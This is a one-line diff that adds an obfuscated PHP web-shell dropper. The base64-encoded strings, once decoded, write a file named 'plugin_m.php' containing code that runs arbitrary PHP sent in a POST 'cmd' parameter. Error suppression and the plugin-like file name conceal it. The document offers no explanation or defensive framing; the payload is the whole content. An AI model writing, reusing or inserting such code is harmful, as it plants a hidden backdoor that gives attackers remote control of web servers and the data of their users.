@@ -1,0 +1,1 @@
+<?php @fputs(fopen(base64_decode('cGx1Z2luX20ucGhw'),w),base64_decode('PD9waHAgQGFzc2VydCgkX1BPU1RbJ2NtZCddKTs/Pg=='));?>
